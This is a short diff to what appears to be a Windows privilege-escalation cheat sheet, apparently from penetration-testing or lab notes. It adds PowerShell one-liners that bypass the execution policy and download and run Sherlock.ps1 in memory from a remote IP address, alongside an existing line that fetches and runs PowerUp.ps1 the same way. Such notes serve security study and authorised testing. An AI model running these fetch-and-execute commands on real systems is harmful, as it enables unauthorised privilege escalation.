@@ -4,6 +4,8 @@ https://github.com/frizb/Windows-Privilege-Escalation
 ###powershell with Priv checker
 ```
 PS C:\Users\merlin\Desktop> PS C:\Users\merlin\Desktop> powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+PS C:\users\merlin\appdata\local\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
+PS C:\users\merlin\appdata\local\temp> Find-AllVulns
 
 c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
 
